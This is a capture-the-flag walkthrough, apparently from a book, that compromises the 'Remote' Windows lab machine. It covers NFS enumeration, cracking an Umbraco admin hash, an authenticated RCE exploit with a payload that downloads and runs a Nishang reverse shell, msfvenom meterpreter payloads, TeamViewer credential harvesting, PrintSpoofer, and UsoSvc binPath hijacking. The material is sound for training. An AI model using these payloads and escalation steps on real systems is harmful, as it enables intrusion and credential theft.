# Exercise: Enumeration and privilege escalation on Remote

This is a Windows machine that exposes an NFS file share which contains a file with a password for an application called Umbraco which is an open source Content Management System \(CMS\). The version of Umbraco running on the Remote machine has an authenticated remote code execution vulnerability and so this allows us to get a reverse shell on the box. Once on the box, enumeration using WinPEAS shows that there are a number of vulnerabilities that could allow escalation. The first is the user has the ability to edit the binary path for the UsoSvc \(Update Orchestrator Service\) and this allows us to run a remote shell as System. The other path is to exploit a vulnerability in an application called TeamViewer that stored its password in an encrypted form in the registry that is vulnerable to cracking. The third is to use Rogue Potato which exploits the fact that the user has the SeImpersonateToken privilege. An alternate to this is to run an exploit called PrintSpoofer.

An nmap scan shows that the Windows box is not an Active Directory domain controller \(no LDAP, DNS or Kerberos\). The box does have a web server on port 80 and has ftp on port 21.

```bash
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_ SYST: Windows_NT
80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp open rpcbind 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/tcp6 rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 2,3,4 111/udp6 rpcbind
| 100003 2,3 2049/udp nfs
| 100003 2,3 2049/udp6 nfs
| 100003 2,3,4 2049/tcp nfs
| 100003 2,3,4 2049/tcp6 nfs
| 100005 1,2,3 2049/tcp mountd
| 100005 1,2,3 2049/tcp6 mountd
| 100005 1,2,3 2049/udp mountd
| 100005 1,2,3 2049/udp6 mountd
| 100021 1,2,3,4 2049/tcp nlockmgr
| 100021 1,2,3,4 2049/tcp6 nlockmgr
| 100021 1,2,3,4 2049/udp nlockmgr
| 100021 1,2,3,4 2049/udp6 nlockmgr
| 100024 1 2049/tcp status
| 100024 1 2049/tcp6 status
| 100024 1 2049/udp status
|_ 100024 1 2049/udp6 status
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds?
2049/tcp open mountd 1-3 (RPC #100005)
5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9685/tcp filtered unknown
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49678/tcp open msrpc Microsoft Windows RPC
49679/tcp open msrpc Microsoft Windows RPC
49680/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 1h02m39s
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2021-01-05T12:17:11
|_ start_date: N/A
```

On port 80, there is a website for ACME Widgets

![Home page of Remote on port 80](../.gitbook/assets/0%20%287%29.png)

The website has references to Umbraco in the source code and on the site itself as an address. Searching for Umbraco on the Internet reveals that Umbraco is a content management system \(CMS\) and that it has a login page that is normally located at http;//remote.htb/umbraco. Navigating to that page gets a login prompt:

![Login page for http://remote.htb/umbraco](../.gitbook/assets/1%20%285%29.png)

This doesn't accept default credentials of admin/admin, admin/password, guest/guest etc. So turning to the FTP site, this accepts anonymous logins but there is nothing in the directory it has access to and we can't write either.

```bash
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $ftp remote.htb
Connected to remote.htb.
220 Microsoft FTP Service
Name (remote.htb:rin): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
257 "/" is current directory.
ftp> put afile.txt
local: afile.txt remote: afile.txt
200 PORT command successful.
550 Access is denied.
ftp>
```

Looking at the nmap output, we can see that the machine has NFS \(Network File System\) running \(the RPC services nfs, mountd on ports 111 and 2049\). NFS is the unix network file sharing service and we can use the utility showmount \(installed from the package nfs-common\) to list any available shares:

```bash
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $showmount -e remote.htb
Export list for remote.htb:
/site_backups (everyone)
```

We can then mount the directory /site\_backups with the mount command:

```bash
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $mkdir site_backups
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $sudo mount -t nfs remote.htb:/site_backups site_backups/
```

The contents of this directory are:

```bash
┌─[rin@parrot]─[~/boxes/Remote/site_backups]
└──╼ $ls -al
total 119
drwx------ 2 nobody 4294967294 4096 Feb 24 2020 .
drwxr-xr-x 1 rin rin. 50 Jan 5 19:38 ..
drwx------ 2 nobody 4294967294 64 Feb 21 2020 App_Browsers
drwx------ 2 nobody 4294967294 4096 Feb 21 2020 App_Data
drwx------ 2 nobody 4294967294 4096 Feb 21 2020 App_Plugins
drwx------ 2 nobody 4294967294 64 Feb 21 2020 aspnet_client
drwx------ 2 nobody 4294967294 49152 Feb 21 2020 bin
drwx------ 2 nobody 4294967294 8192 Feb 21 2020 Config
drwx------ 2 nobody 4294967294 64 Feb 21 2020 css
-rwx------ 1 nobody 4294967294 152 Nov 2 2018 default.aspx
-rwx------ 1 nobody 4294967294 89 Nov 2 2018 Global.asax
drwx------ 2 nobody 4294967294 4096 Feb 21 2020 Media
drwx------ 2 nobody 4294967294 64 Feb 21 2020 scripts
drwx------ 2 nobody 4294967294 8192 Feb 21 2020 Umbraco
drwx------ 2 nobody 4294967294 4096 Feb 21 2020 Umbraco_Client
drwx------ 2 nobody 4294967294 4096 Feb 21 2020 Views
-rwx------ 1 nobody 4294967294 28539 Feb 20 2020 Web.config
```

This looks like the umbraco website files. Searching on the Internet again for details of where Umbraco stores credentials, we note that these are stored normally in the database which by default is Microsoft SQL Server Compact Edition. This database is stored in a file with an extension of sdf. For Umbraco, this is normally stored in the file App\_Data/Umbraco.sdf. If you just looked at the Web.config file, this also references the data source information:

```bash
<connectionStrings>
 <remove name="umbracoDbDSN" />
 <add name="umbracoDbDSN" 
  connectionString="Data Source=|DataDirectory|\Umbraco.sdf;Flush Interval=1;" 
   providerName="System.Data.SqlServerCe.4.0" />
 <!-- Important: If you're upgrading Umbraco, do not clear the connection 
 string / provider name during your web.config merge. -->
</connectionStrings>
```

Theoretically, it should be possible to open the sdf file using a variety of different approaches on a Windows machine. When I tried this however, the database wouldn't open. An easier approach is to simply do strings on the database to extract all of the textual information and then grep for users. If we do this, we find a hash of a password for the user admin in the file:

```bash
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $strings Umbraco.sdf | grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa
    {"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa
    {"hashAlgorithm":"SHA1"}admin@htb.localen-US
    feb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa
    {"hashAlgorithm":"SHA1"}admin@htb.localen-US
    82756c26-4321-4d27-b429-1b5c7c4f882f
```

Cracking the hash \(b8be16afba8c314ad33d812f22a04991b90e2aaa\) with John The Ripper reveals the password baconandcheese

```bash
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
…
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese (?)
```

Logging into the Umbraco site with user admin@local.htb and password baconandcheese gives us the admin site

![Admin page for remote.htb umbraco site](../.gitbook/assets/2%20%288%29.png)



In the help page we note that the version of Umbraco is 7.12.4

![Help page for remote.htb umbraco site](../.gitbook/assets/3%20%286%29.png)

Using searchsploit, we find an authenticated remote code execution exploit for this particular version

```bash
┌─[oztechmuse@parrot]─[~/boxes/Remote]
└──╼ $searchsploit umbraco
-------------------------- ---------------------------------
 Exploit Path
-------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit) | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution | aspx/webapps/46153.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting | php/webapps/44988.txt
```

We can copy the Python exploit to our local directory:

```bash
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $searchsploit -m aspx/webapps/46153.py
 Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
 URL: https://www.exploit-db.com/exploits/46153
 Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
File Type: Python script, ASCII text executable, with CRLF line terminators
Copied to: /home/rin/boxes/Remote/46153.py
```

We need to change the cmd string and the authentication and host details

```bash
{ string cmd = "wget http://10.10.14.117:8082/afile"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
login = "admin@htb.local;
password="baconandcheese";
host = "http://remote.htb";
```

We can run a Python web server on port 8082 and run the exploit to verify that we get a hit which we do:

```bash
┌─[rin@parrot]─[~/boxes/Remote]
└──╼ $python3 -m http.server 8082
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.129.1.153 - - [05/Jan/2021 21:04:20] code 404, message File not found
10.129.1.153 - - [05/Jan/2021 21:04:20] "GET /afile HTTP/1.1" 404 -
```

To get a reverse shell, we could use Metasploit but we can just as easily use Nishang \(https://github.com/samratashok/nishang\). We have used this before, so we can use Invoke-PowerShellTcp.ps1 and put the following line at the bottom of the file and rename it as revsh.ps1

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.117 -Port 6001
```

We can then start a netcat listener on our machine and change the code of the exploit to download and execute the revsh.ps1 script. To do that, we can use the PowerShell command Invoke-WebRequest \(IWR\) to download the file and then execute it using Invoke-Expression \(IEX\). The code would then look like:

```bash
{ string cmd = "IEX(IWR http://10.10.14.117:8082/revsh.ps1 -UserBasicParsing)"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
login = "admin@htb.local;
password="baconandcheese";
host = "http://remote.htb";
```

When we execute the exploit, we get a hit on the Python web server and then our netcat listener is invoked:

```bash
┌─[oztechmuse@parrot]─[~]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
connect to [10.10.14.117] from (UNKNOWN) [10.129.1.153] 49691
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\windows\system32\inetsrv>
```

When we run whoami /all we find that we are the IIS user \(iis apppool\defaultapppool\) and that there are no other regular users on the machine other than Administrator. If we look in c:\Users\Public, we find the user.txt file with the flag. The next thing we can do is to download and run winPEAS.exe. We can use the winPEAS.exe program that is in the winPEAS/winPEASexe/winPEAS/bin/x64/Release directory. You can download it to the c:\Users\Public\Downloads using the PowerShell

```bash
wget http://10.10.14.117:8082/winPEAS.exe -OutFile peas.exe
```

Runing this, we see that winPEAS reports, we get a number of exploitable escalation paths reported. Firstly there is a list of OS level vulnerabilities related to the specific build. We will leave those for the moment to see what other options area available.

```bash
[!] CVE-2019-0836 : VULNERABLE
 [>] https://exploit-db.com/exploits/46718
 [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user
-to-system/
 [!] CVE-2019-0841 : VULNERABLE
 [>] https://github.com/rogue-kdc/CVE-2019-0841
 [>] https://rastamouse.me/tags/cve-2019-0841/
 [!] CVE-2019-1064 : VULNERABLE
 [>] https://www.rythmstick.net/posts/cve-2019-1064/
 [!] CVE-2019-1130 : VULNERABLE
 [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
 [!] CVE-2019-1253 : VULNERABLE
 [>] https://github.com/padovah4ck/CVE-2019-1253
 [!] CVE-2019-1315 : VULNERABLE
 [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
 [!] CVE-2019-1385 : VULNERABLE
 [>] https://www.youtube.com/watch?v=K6gHnr-VkAg
 [!] CVE-2019-1388 : VULNERABLE
 [>] https://github.com/jas502n/CVE-2019-1388
 [!] CVE-2019-1405 : VULNERABLE
 [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the
-upnp-device-host-service-and-the-update-orchestrator-service/
```

A potentially easier path to escalation is the fact that our account has access to the configuration of the UsoSvc which means that we can change the path of the binary it points to and run our own script or binary. This looks frar more exploitable. But let us continue and look if there is anything else.

```bash
[+] Modifiable Services
 [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
 LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
 UsoSvc: AllAccess, Start
Looking at the non-Microsoft services on the machine, you will notice that there is a service called TeamViewer that is running. This is an application that allows remote desktop access.
 [+] Interesting Services -non Microsoft-
 [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
 TeamViewer7(TeamViewer GmbH - TeamViewer 7)["C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"] - Auto - Running
 TeamViewer Remote Software
winPEAS doesn't print out a version but navigating to the director it is installed in c:\Program Files (x86)\TeamViewer\Version7, we find a log file TeamViewer7_Logfile.log that we can extract the version from
cat TeamViewer7_Logfile.log | findstr -i version
Version: 7.0.43148
AppPath: C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe
```

This version of TeamViewer kept an encrypted version of passwords in the Windows registry and the key and IV are known \(https://whynotsecurity.com/blog/teamviewer/\) which means that they can be decrypted. Metasploit has a module to harvest TeamViewer credentials. So this is certainly something we can try.

A final exploit that is open to us is one that makes use of the SeImpersonatePrivilege which can be exploited using Juicy Potato which we have done on another machine earlier in this book. We will do this with another technique using an application called PrintSpoofer \(https://github.com/itm4n/PrintSpoofer\)

Let us start with the TeamViewer exploit. To do this, we will use Metasploit and so we need to get a meterpreter shell. So we can create a meterpreter reverse shell with msfvenom:

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.14.117 LPORT=4444 -f exe &gt; metsh.exe

We can then copy that to the Remote machine as before using wget and then running the binary once we have set up a meterpreter handler in Metasploit using exploit/multi/handler and setting the options of LHOST and Payload to match what we used in msfvenom. After running the handler, we can run the meterpreter reverse shell and establish a session.

 Once in the session, we can background it and then search for TeamViewer. This gives us a module windows/gather/credentials/teamviewer\_passwords which we can then run to get the stored password:

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search teamviewer
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/server/teamviewer_uri_smb_redirect normal No TeamViewer Unquoted URI Handler SMB Redirect
 1 post/windows/gather/credentials/teamviewer_passwords normal No Windows Gather TeamViewer Passwords
Interact with a module by name or index. For example info 1, use 1 or use post/windows/gather/credentials/teamviewer_passwords
msf6 exploit(multi/handler) > use 1
msf6 post(windows/gather/credentials/teamviewer_passwords) > options
Module options (post/windows/gather/credentials/teamviewer_passwords):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SESSION yes The session to run this module on.
 WINDOW_TITLE TeamViewer no Specify a title for getting the window handle, e.g. TeamViewer
msf6 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/credentials/teamviewer_passwords) > run
[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /root/.msf4/loot/20210106122808_default_10.129.1.153_host.teamviewer__511687.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
[*] Post module execution completed
```

This gives us the password !R3m0te!which by itself is not useful but we can see if it will work with the Administrator user using evil-winrm which it does!

```bash
┌─[✗]─[oztechmuse@parrot]─[~/boxes/Remote]
└──╼ $evil-winrm -u Administrator -p '!R3m0te!' -i remote.htb
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
```

To run the exploit for PrintSpoofer, download the executable from the release on GitHub \(https://github.com/itm4n/PrintSpoofer\). We can use our meterpreter session to upload it and then simply run it in a shell to get access to nt authority\system

```bash
meterpreter > upload /home/rin/Downloads/PrintSpoofer64.exe "c:\users\public\downloads\spoof.exe"
[*] uploading : /home/oztechmuse/Downloads/PrintSpoofer64.exe -> c:\users\public\downloads\spoof.exe
[*] Uploaded 26.50 KiB of 26.50 KiB (100.0%): /home/rin/Downloads/PrintSpoofer64.exe -> c:\users\public\downloads\spoof.exe
[*] uploaded : /home/rin/Downloads/PrintSpoofer64.exe -> c:\users\public\downloads\spoof.exe
meterpreter > shell
Process 8844 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\users\public\downloads>.\spoof -i -c cmd
.\spoof -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```

Finally, the third way of exploiting this box is to change the UsoSvc path. We can use the application sc.exe to query the status of the service, stop it, change the path it is using for the service binary and then start it again. We can use the same meterpreter reverse shell we used previously.

In Metasploit, we can go back to exploit/multi/handler and run it again. We don't need to change anything and we can run using the command with the -j flag so that it runs in the background.

On the Remote machine, we then use sc.exe as outlined above:

```bash
PS C:\users\public\Downloads> sc.exe query usosvc
SERVICE_NAME: usosvc
 TYPE : 30 WIN32
 STATE : 4 RUNNING
 (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
 WIN32_EXIT_CODE : 0 (0x0)
 SERVICE_EXIT_CODE : 0 (0x0)
 CHECKPOINT : 0x0
 WAIT_HINT : 0x0
PS C:\users\public\Downloads> sc.exe stop usosvc
SERVICE_NAME: usosvc
 TYPE : 30 WIN32
 STATE : 3 STOP_PENDING
 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
 WIN32_EXIT_CODE : 0 (0x0)
 SERVICE_EXIT_CODE : 0 (0x0)
 CHECKPOINT : 0x3
 WAIT_HINT : 0x7530
PS C:\users\public\Downloads> sc.exe CONFIG usosvc binPath="cmd.exe /c c:\users\public\downloads\metsh.exe"
PS C:\users\public\Downloads> sc.exe start usosvc
[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion
In Metasploit, we will get a session as NT AUTHORITY\SYSTEM
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.117:4444
msf6 exploit(multi/handler) > [*] Sending stage (175174 bytes) to 10.129.1.153
msf6 exploit(multi/handler) > sessions
Active sessions
===============
 Id Name Type Information Connection
 -- ---- ---- ----------- ----------
 1 meterpreter x86/windows IIS APPPOOL\DefaultAppPool @ REMOTE 10.10.14.117:4444 -> 10.129.1.153:49884 (10.129.1.153)
 4 meterpreter x86/windows 10.10.14.117:4444 -> 10.129.1.153:49900 (10.129.1.153)
msf6 exploit(multi/handler) > sessions -i 4
[*] Starting interaction with 4...
meterpreter > [*] Meterpreter session 4 opened (10.10.14.117:4444 -> 10.129.1.153:49900) at 2021-01-06 13:15:47 +0800
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

An important thing to notice about these different approaches is that they result in becoming different things. In the case of getting the Administrator password through TeamViewer, we actually have access to the Administrator account itself. The other approaches escalate us to the LocalSystem account which is a service user account who's account token includes the SIDs of NT AUTHORITY\SYSTEM and BUILTIN\Administrators. This account does not have a password and so, although more powerful in some ways than the Administrator account, presents different challenges when using it to establish persistence and other activities.

Another important consideration is that even though winPEAS suggested CVEs that might be exploitable for this version of the operating system, all of them come with certain conditions that need to be satisfied before they are able to be exploited. CVE-2019-1130 for example suggests using a proof of concept \(https://github.com/S3cur3Th1sSh1t/SharpByeBear\) that exploits a race condition. This vulnerability is a timing problem that necessitates multiple cores on the machine and access to user programs Edge or Cortana. We don't have access to these programs in this situation. Likewise, a Metasploit module that exploits CVE-2019-1405 \(and CVE-2019-1322\) has a Metasploit module that fails to work on this machine. So just because a machine is theoretically vulnerable to a CVE because it has the correct build number doesn't mean all conditions will be present to make it exploitable.



